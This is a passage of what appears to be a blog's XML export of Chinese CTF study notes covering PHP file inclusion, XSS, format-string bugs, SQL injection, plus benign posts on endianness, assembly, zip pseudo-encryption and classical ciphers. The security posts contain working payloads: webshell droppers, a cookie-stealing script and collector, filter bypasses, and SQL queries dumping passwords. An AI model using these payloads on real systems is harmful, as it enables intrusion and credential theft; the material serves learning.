查看系统版本c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件c:\windows\repair\sam // 存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini // MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码c:\windows\php.ini // php 配置信息 Linux/Unix系统12345678910111213/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 session文件包含漏洞(待续)利用条件： session的存储位置可以获取。 通过phpinfo的信息可以获取到session的存储位置。 通过phpinfo的信息，获取到session.save_path为/var/lib/php/session： 获取到session的存储位置 通过猜测默认的session存放位置进行尝试。 如linux下默认存储在/var/lib/php/session目录下： 默认存储 session中的内容可以被控制，传入恶意代码。 远程包含shell新建file.txt保存在远程服务器上： 1&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt; 如果目标网站存在远程包含漏洞，则可以通过访问：http://www.xx1.com/index.php?file=http://www.xx2.com/file.txt会在服务器根目录下生产一个shell.php内容为: 1&lt;?php eval($_POST[key]);?&gt; 利用php协议进行包含(参考《PHP伪协议》）data: php5.2以后版本php://input 需要开启allow_url_include例子: 1http://www.test.com/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;%00 本地包含配合文件上传如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传上传一个图片木马file.jpg，内容为： 1&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt; 访问URL：http://www.xxx.com/index.php?file=./file.jpg生成shell.php。 0x06 绕过方法问号绕过源码： 1&lt;?php include($_GET[&apos;filename&apos;] . &quot;.html&quot;); ?&gt; 代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。绕过方式：在最后加？payload：http://www.xxx.com/index.php?filename=http://xxx2/file.txt? 井号绕过http://www.xxx.com/index.php?filename=http://xxx2/file.txt%23 截断包含源码： 123&lt;?php Include $_GET[&apos;page&apos;].&quot;.php&quot;?&gt; %00截断包含新建file.jpg，写入内容: 1&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt; 这样的话比如上传一个file.jpg图片马，则访问http://www.xxx.com/file.jpg时，访问的是file.jgp.php，以为没有这个文件所以报错。这是，可以尝试访问http://www.xxx.com/file.jpg%00 使用长目录截断常用绕过方式： 12345././././././././././././././etc/passwd////////////////////////////etc/passwd../a/etc/passwd/../a/etc/passwd/../a/etc/passwd 在windows下目录最大长度为256字节，linux下为4096字节，其后面超出部分被丢弃。所以成功绕过]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS漏洞]]></title>
    <url>%2F2019%2F11%2F07%2FXSS%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 简介跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨，导致执行用户提交的恶意js脚本，对网站自身造成危害。 0x01 分类反射型只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫”非持久型xss”。 存储型会把用户输入的数据”存储”在服务器端，也叫”持久性xss”，常见留言板等可以提交展示用户输入内容的功能点。 DOM型这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS 的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。 反射型和存储型，是与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。 0x03 危害cookie劫持（窃取cookie） 后台增删改文章等操作（类似于csrf骗取用户点击，利用js模拟浏览器发包，借助xmlhttprequest类） 钓鱼，利用xss构造出一个登录框，骗取用户账户密码。 Xss蠕虫（利用xss漏洞进行传播） 修改网页代码 利用网站重定向 获取用户信息（如浏览器信息，IP地址等）0x04 检测方法通常有一些方式可以测试网站是否有正确处理特殊字符： 12345678910&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert (vulnerable)&lt;/script&gt;%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;img src=&quot;http://888.888.com/999.png&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;&lt;div style=&quot;height:expression(alert(&apos;XSS&apos;),1)&quot;&gt;&lt;/div&gt; XSS探针我们可以在测试xss的位置写入以下代码，查看页面源码，观察哪些代码被过滤或者转义。 1&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125; xss探针可检测出网站有没有对xss漏洞做最基础的防御。 0x05 常见 XSS 注入点HTML 节点内容，例如动态生成，里面包含用户输入信息，那么有可能会携带脚本；HTML 节点属性，例如图片的 onerror、onclick 事件；超链接 href、输入框 value 属性；JavaScript 代码，例如 JS 代码中存在后台注入的变量或如 react 的 dangerouslySetInnerHTML；富文本，例如富文本需要过滤需要正常展示的 html 代码之外的脚本； 0x06 实例获取cookiecookie.php后端代码： 123456&lt;? php$cookie=$_GET[&apos;cookie&apos;];$log=fopen(&quot;cookie. txt&quot;,&quot;a&quot;); fwrite($1og,$cookie.&quot;\n&quot;);fclose($1og);?&gt; 这是用于接收cookie，并将其写入cookie.txt文件中。 在存在xss漏洞的地方，插入以下代码，便可以将cookie发送到cookie.php，并且将cookie参数传递进去，写入文件中。 123&lt;script〉new Image (). src=&quot;http://localhost/sspt/XSS/cookie.php?cookie=&quot;+document. cookie;&lt;/script〉 常用获取cookie的js代码： 12&lt;img src=&quot;http://localhost/cspt/XSS_cookie.php?cookie=&apos;+document.cookie&quot;&gt;&lt;/img&gt;&lt;script&gt;new Image().src=&quot;http://localhost/cspt/XSS/xss_cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt; 提交之后，本地cookie.txt文件中就会写入cookie值。 利用xss篡改网页前提：网站必须存在存储型xss漏洞，并且会将结果返回到页面上。这样我们就可以插入一段js代码，作用在于获取网站源码中的标签，然后修改其中的属性值，达到修改网页的效果。编写javascript脚本如下： 12345var objs=document. getElementsByTagName(&quot;a&quot;);var b=objs. length ;for(var a=0;a&lt;b;a++)&#123;objs[a]. href=&quot;http://www.bilibili.com&quot;;&#125; 将以下语句插入存在存储型xss漏洞的网站 1&lt;script type=&apos;text/javascript&apos; src=&apos;http://localhost/cspt/XSS/test.js&apos;&gt;&lt;/script&gt; 可以发现存在该漏洞的网页上所有的链接都变成了www.bilibili.com 利用xss获取用户信息xss获取用户信息，运用最多的还是获取cookie信息，但除此之外，还可以获取用户浏览器版本、外网IP地址、浏览器安装的插件类型等等。以下列举了利用xss获取的客户端用户信息（包含但不仅限于以下几种）。 123alert(navigator.userAgent);读取userAgent内容alert(document.cookie);读取用户cookie内容利用java环境，调用java Applet的接口获取客户端本地IP 0x07 常用绕过技巧转换大小写大小写混写双引号改单引号引号改为/用全角字符使用javascript伪协议使用回车、空格等特殊字符在css的style中使用/**/注释符使用字符编码利用事件触发xss 绕过XSS filter绕过xss filter的前提在于，xss filter使用了黑名单，并且没有过滤完全。前提一：如果过滤了”《script》”字符串,但没有过滤”&lt;”、”&gt;”字符，则可以使用javascript:[code]伪协议的形式。 1&lt;img src=&quot;javascript:alert(&apos;test&apos;);&quot;&gt; 前提二：过滤了《script》，且只过滤一次。 1&lt;scr&lt;script&gt;ipt&gt; 前提三：没有正确处理空格、回车等字符 123&lt;img src=&quot;javasCript:Alert(/xss/)&quot; width=100&gt; 参考资料：https://thief.one/2017/05/31/1/https://zh.wikipedia.org/w/index.php?title=%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC&amp;action=edit&amp;section=3]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大端小端存储模式]]></title>
    <url>%2F2019%2F10%2F31%2F%E5%A4%A7%E7%AB%AF%E5%B0%8F%E7%AB%AF%E5%AD%98%E5%82%A8%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[端模式（Endian）的这个词出自Jonathan Swift书写的《格列佛游记》。这本书根据将鸡蛋敲开的方法不同将所有的人分为两类，从圆头开始将鸡蛋敲开的人被归为Big Endian，从尖头开始将鸡蛋敲开的人被归为Littile Endian。anny Cohen一位网络协议的开创者，第一次使用这两个术语指代字节顺序，后来就被大家广泛接受。 小端：较高的有效字节存放在较高的的存储器地址，较低的有效字节存放在较低的存储器地址。大端：较高的有效字节存放在较低的存储器地址，较低的有效字节存放在较高的存储器地址。例如对于0x12345678的存储： 小端模式：（从低字节到高字节）地位地址 0x78 0x56 0x34 0x12 高位地址 大端模式：（从高字节到低字节）地位地址 0x12 0x34 0x56 0x78 高位地址 假设从内存地址 0x0000 开始有以下数据：0x0000 0x0001 0x0002 0x00030x12 0x34 0xab 0xcd如果我们去读取一个地址为 0x0000 的四个字节变量，若字节序为大端模式，则读出结果为0x1234abcd；若字节序为小端模式，则读出结果为0xcdab3412。 如果我们将0x1234abcd 写入到以 0x0000 开始的内存中，则Little endian 和 Big endian 模式的存放结果如下： 123地址 0x0000 0x0001 0x0002 0x0003 大端： 0x12 0x34 0xab 0xcd 小端： 0xcd 0xab 0x34 0x12 一般来说，x86 系列 CPU 都是 little-endian 的字节序，PowerPC 通常是 big-endian，网络字节顺序也是 big-endian。还有的CPU 能通过跳线来设置 CPU 工作于 Little endian 还是 Big endian 模式]]></content>
      <categories>
        <category>组成原理</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串]]></title>
    <url>%2F2019%2F10%2F30%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
    <content type="text"><![CDATA[0x00 格式化字符串介绍c语言都知道printf，fprintf，sprintf,snprintf等这一类类printf函数中经常会用到“%”后面加一个或多个字符做说明符，例如 12345#include &lt;stdio.h&gt;int main(void)&#123; printf(&quot;My name is %s&quot;,&quot;Van&quot;); return 0;&#125; 运行后： My name is Vanprintf函数的第一个参数就是格式化字符串，它主要是依靠一个用来告诉程序如何进行格式化输出的说明符。在C程序中我们有许多用来格式化字符串的说明符，在这些说明符后面我们可以填充我们的内容。说明符的前缀是“%”字符,以下是几个常见的说明符： 123456789101112131415161718192021%order$s 第order个参数的位置 eg:%5$s%s 从内存中读取数据%x 输出十六进制数%c：输出字符，配上%n可用于向指定地址写数据。%d：输出十进制整数，配上%n可用于向指定地址写数据。%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。其他都是用来打印的，而%n可以用来把一个int型的值写到指定的地址中。 0x01 漏洞原理想让用户输入一个名字，然后再把这个名字原样输出，正常情况下这样写： 123char str[100];scanf(&quot;%s&quot;,str);printf(&quot;%s&quot;,str); 这个程序没有问题。如果写成这样： 123char str[100];scanf(&quot;%s&quot;,str);printf(str); 这个程序在printf处省略了格式化字符串参数，在这里造成了严重的格式化字符串漏洞。一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。 demo: 123456789#include &lt;stdio.h&gt;int main(void)&#123; char a[100]; scanf(&quot;%s&quot;,a); printf(a); return 0;&#125; 假设我们的输入为: AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x程序的输出依次为： AAAA61fe4c,61ffcc,76e4d250,70734fbf,fffffffe,76e473da,41414141,252c7825,78252c78,2c78252c,252c7825 注意，这其中有一组为41414141，那就是这个字符串开始的位置。 看一下栈里的样子： 0061FE30 0061FE4C |format = &quot;AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x&quot; 0061FE34 0061FE4C |&lt;%x&gt; = 0x61FE4C 0061FE38 0061FFCC |&lt;%x&gt; = 0x61FFCC 0061FE3C 76E4D250 |&lt;%x&gt; = 0x76E4D250 0061FE40 FF12BE58 |&lt;%x&gt; = 0xFF12BE58 0061FE44 FFFFFFFE |&lt;%x&gt; = 0xFFFFFFFE 0061FE48 76E473DA |&lt;%x&gt; = 0x76E473DA 0061FE4C 41414141 |&lt;%x&gt; = 0x41414141 0061FE50 252C7825 |&lt;%x&gt; = 0x252C7825 0061FE54 78252C78 |&lt;%x&gt; = 0x78252C78 0061FE58 2C78252C |&lt;%x&gt; = 0x2C78252C 0061FE5C 252C7825 \&lt;%x&gt; = 0x252C7825 0061FE60 78252C78 0061FE64 2C78252C 0061FE68 252C7825 0061FE6C 78252C78 0061FE70 00000000 0061FE74 00000000 0061FE78 000000000x0061FE4C 是格式化字符串开始的位置，通过不断的取变量操作，最终我们就能读取到程序的每一个位置。 0x02 实现任意地址读任意地址读我们需要用到printf格式化字符串的另外一个特性，”$“操作符。这个操作符可以输出指定位置的参数。 #include &lt;stdio.h&gt; int main(void) { char str[100]; scanf(&quot;%s&quot;,str); printf(str); return 0; }首先测出字符串开头的偏移量： veritas@ubuntu:~/pwn$ ./str AAAA%1$x AAAAffa87a68 veritas@ubuntu:~/pwn$ ./str AAAA%2$x AAAAc2 veritas@ubuntu:~/pwn$ ./str AAAA%3$x AAAAf766376b veritas@ubuntu:~/pwn$ ./str AAAA%4$x AAAAffb6ad4e veritas@ubuntu:~/pwn$ ./str AAAA%5$x AAAAffab456c veritas@ubuntu:~/pwn$ ./str AAAA%6$x AAAA41414141由此我们测出偏移为6然后我们用pwntools编写如下脚本 12345678from pwn import *context.log_level = &apos;debug&apos;cn = process(&apos;str&apos;)cn.sendline(p32(0x08048000)+&quot;%6$s&quot;)#cn.sendline(&quot;%7$s&quot;+p32(0x08048000))print cn.recv() （未完待续）参考资料：https://veritas501.github.io/2017/04/28/格式化字符串漏洞学习/]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>CTF PWN</tag>
        <tag>二进制漏洞</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test与je指令组合用法]]></title>
    <url>%2F2019%2F10%2F23%2Ftest%E4%B8%8Eje%E6%8C%87%E4%BB%A4%E7%BB%84%E5%90%88%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x00 指令介绍test 指令用于两个操作数的按位AND运算，并根据结果设置标志寄存器，结果本身不会写回到目的操作数。要点： 1. AND 运算结果为0时， ZF(zero flag)置位； 2. test可以影响CF，OF，PF，SF，ZF标志位； 3. 两个操作数相等，同时为0时，AND 结果为0， 此时ZF置位。je 指令【Jump if Equals】在ZF被置位时跳转。je 是 jz 【Jump if Zero】的别名 0x01 test 和 je 连用TEST EAX,EAX JE some_address 这段代码的含义是： 如果eax==0的话就跳转到”some_address”。 运算过程： CPU只在 ZF = 1的时候跳转，因此，需要让AND(EAX, EAX) = 0 。而什么时候这个运算为0呢？上文已经提过了，就是EAX = 0的时候。隐含条件是test的两个运算数相等，都为EAX。 等价C代码： if(eax == 0) { goto some_address }0x02 应用举例1234567; Conditional Jumptest cl, cl ; set ZF to 1 if cl == 0je 0x804f430 ; jump if ZF == 1; ortest eax, eax ; set SF to 1 if eax &lt; 0 (negative)js error ; jump if SF == 1 0x03 参考https://stackoverflow.com/questions/13064809/the-point-of-test-eax-eaxhttps://en.wikipedia.org/wiki/TEST_(x86_instruction)https://blog.csdn.net/zz709196484/article/details/77755243https://blog.csdn.net/ms2146/article/details/5279442转载自https://blog.csdn.net/counsellor/article/details/81005101，遵循 CC 4.0 BY-SA 版权协议]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>CTF 逆向</tag>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zip伪加密]]></title>
    <url>%2F2019%2F10%2F23%2F%E4%BC%AA%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[zip文件组成一个 ZIP文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。 伪加密原理zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。 判断是否为伪加密无加密压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为00 00 假加密压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为09 00 真加密压缩源文件数据区的全局加密应当为09 00 且压缩源文件目录区的全局方式位标记应当为09 00 破解方法winhex打开zip文件。 把504B0304后的第3、4个byte改成0000还有 把504B0102后的第5、6个byte改成0000即可破解伪加密。]]></content>
      <categories>
        <category>安全杂项</category>
      </categories>
      <tags>
        <tag>CTF 安全杂项</tag>
        <tag>文件结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的古典密码与常用脚本]]></title>
    <url>%2F2019%2F10%2F23%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B8%8E%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[栅栏密码1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python3# -*- coding:utf-8 -*-a = open(r&apos;crypto4.txt&apos;,&apos;r&apos;)ciphertext = a.read()b = len(ciphertext)print(&apos;The ciphertext :&apos;,ciphertext)print(&apos;The length of ciphertext is&apos;,b)#将字符串转化为数组形式ciphertext = [ciphertext[i:i+1] for i in range(0,b,1)]#获取可以解密的栅栏数c =[]num = 1while num &lt;= b: if b%num == 0: c.append(num) else: pass num += 1print(&apos;每栏个数可为:&apos;,c)#将密文按照栅栏数进行分组for step in c: d = [ciphertext[i:i+step] for i in range(0,b,step)] flag = &apos;&apos; for i in range(step): for x in d: e = x[i] flag += e print(&apos;解密时每栏个数:&apos;,step,&apos;\n&apos;,d,&apos;\n&apos;,&apos;result:&apos;,flag) 培根密码 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python3#-*- coding:utf-8 -*-import re#密文转化为指定格式s = &apos;AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA&apos;a = s.lower()#字典CODE_TABLE = &#123; &apos;a&apos;:&apos;aaaaa&apos;,&apos;b&apos;:&apos;aaaab&apos;,&apos;c&apos;:&apos;aaaba&apos;,&apos;d&apos;:&apos;aaabb&apos;,&apos;e&apos;:&apos;aabaa&apos;,&apos;f&apos;:&apos;aabab&apos;,&apos;g&apos;:&apos;aabba&apos;, &apos;h&apos;:&apos;aabbb&apos;,&apos;i&apos;:&apos;abaaa&apos;,&apos;j&apos;:&apos;abaab&apos;,&apos;k&apos;:&apos;ababa&apos;,&apos;l&apos;:&apos;ababb&apos;,&apos;m&apos;:&apos;abbaa&apos;,&apos;n&apos;:&apos;abbab&apos;, &apos;o&apos;:&apos;abbba&apos;,&apos;p&apos;:&apos;abbbb&apos;,&apos;q&apos;:&apos;baaaa&apos;,&apos;r&apos;:&apos;baaab&apos;,&apos;s&apos;:&apos;baaba&apos;,&apos;t&apos;:&apos;baabb&apos;,&apos;u&apos;:&apos;babaa&apos;, &apos;v&apos;:&apos;babab&apos;,&apos;w&apos;:&apos;babba&apos;,&apos;x&apos;:&apos;babbb&apos;,&apos;y&apos;:&apos;bbaaa&apos;,&apos;z&apos;:&apos;bbaab&apos;&#125;#5个一组进行切割并解密def peigendecode(peigen): msg =&apos;&apos; codes = re.findall(r&apos;.&#123;5&#125;&apos;, a) for code in codes: if code ==&apos;&apos;: msg += &apos; &apos; else: UNCODE =dict(map(lambda t:(t[1],t[0]),CODE_TABLE.items())) msg += UNCODE[code] return msgflag = peigendecode(a)print(&apos;flag is &apos;,flag) 轮转机密码12345678910111213141516import re sss=&apos;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt; &apos;m=&quot;NFQKSEVOQOFNP&quot; content=re.findall(r&apos;&lt; (.*?) &lt;&apos;,sss,re.S) iv=[2,3,7,5,13,12,9,1,8,10,4,11,6] vvv=[] ans=&quot;&quot; for i in range(13): index=content[iv[i]-1].index(m[i]) vvv.append(index)for i in range(0,26): flag=&quot;&quot; for j in range(13): flag+=content[iv[j]-1][(vvv[j]+i)%26] print flag 仿射密码1234567891011121314151617# coding:utf-8# a,b为y=ax+b的系数# y = 17*x-8 flag&#123;szzyfimhyzd&#125; 答案格式：flag&#123;********&#125;# Crypto为密文，res为明文，暴力破解得到，不用求取逆元import stringcrypto = &quot;szzyfimhyzd&quot;a = 17b = -8word = string.ascii_lowercase# print wordres = &apos;&apos;for c in crypto: for w in word: if ord(c)-97 == ((ord(w)-97)*a + b)%26: res += wprint res# affineshift 进制转换12345678910111213141516import binasciitext = &quot;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&quot;solution = &apos;&apos;text2 = text.split(&apos; &apos;)for x in text2: print x if x[0] == &apos;b&apos;: #binary solution += chr(int(x[1:],2)) elif x[0] == &apos;x&apos;: # hexadecimal solution += x[1:].decode(&quot;hex&quot;) elif x[0] == &apos;d&apos;: # decimal solution += chr(int(x[1:])) elif x[0] == &apos;o&apos;: # octal solution += chr(int(x[1:],8))print solution 16进制10进制2进制转字符串1234567891011121314import libnumimport binasciis=&quot;flag&#123;pcat&#125;&quot; #print libnum.s2n(s)print binascii.hexlify(s)n=0x666c61677b706361747d #print libnum.n2s(n)print binascii.unhexlify(str(n))b=&apos;01110000011000110110000101110100&apos; print libnum.b2s(b) unicode 转换1234567891011a=&apos;\u76;\u122;\u69;\u120;\u79;\u83;\u56;\u120;\u77;\u68;\u69;\u118;\u77;\u84;\u65;\u52;\u76;\u122;\u107;\u53;\u76;\u122;\u69;\u120;\u77;\u83;\u56;\u120;\u77;\u68;\u107;\u118;\u77;\u84;\u65;\u120;\u76;\u122;\u69;\u120;\u78;\u105;\u56;\u120;\u77;\u84;\u69;\u118;\u79;\u84;\u99;\u118;\u77;\u84;\u69;\u50;\u76;\u122;\u69;\u120;\u78;\u105;\u56;\u53;\u78;\u121;\u56;\u53;\u79;\u83;\u56;\u120;\u77;\u68;\u99;\u118;\u79;\u84;\u99;\u118;\u77;\u84;\u69;\u119;\u76;\u122;\u69;\u119;\u77;\u67;\u56;\u120;\u77;\u68;\u65;\u118;\u77;\u84;\u65;\u120;\u76;\u122;\u69;\u119;\u77;\u105;\u56;\u120;\u77;\u68;\u69;\u118;\u77;\u84;\u69;\u119;\u76;\u122;\u107;\u53;\u76;\u122;\u69;\u119;\u77;\u83;\u56;\u120;\u77;\u84;\u107;\u118;\u77;\u84;\u69;\u120;\u76;\u122;\u69;\u120;\u78;\u67;\u56;\u120;\u77;\u68;\u103;\u118;\u77;\u84;\u65;\u119;&apos;b=a.decode(&quot;utf-8&quot;)print(b)方法：s_unicode = u&apos;\u810f\u4e71&apos;s_str = s_unicode.encode(&apos;unicode-escape&apos;).decode(&apos;string_escape&apos;) 问题二：将&apos;\u810f\u4e71&apos;转换为u&apos;\u810f\u4e71&apos;方法：s_str = &apos;\u810f\u4e71&apos;s_unicode = s_str.decode(&apos;unicode-escape&apos;) 数字转字符串1234567891011121314a=[119,101,108,99,111,109,101,116,111,97,116,116,97,99,107,97,110,100,100,101,102,101,110,99,101,119,111,114,108,100]s=&apos;&apos;for i in a: s+=chr(i)print(s)s = &apos;102 108 97 103 123 115 113 108 109 52 112 95 49 53 95 112 48 119 101 114 102 117 108 125&apos;ls = s.split(&apos; &apos;)# print lsflag = &apos;&apos;for i in ls: flag += chr(int(i))print flag 字符串转16进制12import binasciiprint(binascii.b2a_hex(&apos;addddaasasabcd&apos;))]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF密码学</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL回显注入]]></title>
    <url>%2F2019%2F10%2F20%2FSQL%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[0x00 注入过程三种注入123where user_id = 1 or 1=1where user_id = &apos;1&apos; or &apos;1&apos;=&apos;1&apos;where user_id =&quot; 1 &quot;or &quot;1&quot;=&quot;1&quot; 注释符12345# 单行注释,常编码为%23--空格 单行注释 注意为短线短线空格/*（）*/ 多行注释 至少存在俩处的注入 /**/常用来作为空格 判断字段数1order by 确定回显点1union select 1,2 查询数据库信息1version() datadir 查询用户名，数据库名12345user() database()1&apos; union select 1,database()#1&apos; union select user(),database()#Version()# 查询表名11&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()# 查询列名121&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273#1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =&apos;users&apos;# 文件读取1union select 1,load_file(&apos;C:\\wondows\\win.ini&apos;)# 写入 webshell1select..into outfile... 猜用户数据1231&apos; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #1&apos; union select null,concat_ws(char(32,58,32),user,password) from users # 1&apos; union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users # 猜 root 用户11&apos; union select 1,group_concat(user,password) from mysql.user# 0x01 bugku 这是一个神奇的登录框1、打开题目链接，是一个登录界面，抓包后传数据进行尝试 2、先尝试admin_name=1&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到Try Again! 3、尝试admin_name=1’&amp;admin_passwd=1&amp;submit=GO+GO+GO 仍然得到Try Again! ，说明 ’被过滤了 4、尝试admin_name=1”&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到You have an error in your SQL syntax; check the manual that corresponds toyour MySQL server version for the right syntax to use near ‘1”‘ at line 1 说明应该用 “ 分隔,”符号没有被过滤。 5、尝试admin_name=1”%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 发现没有报错了，说明，需要注释掉一些多余的东西来得到正确结果 6、判断回显位置 admin_name=1” union select 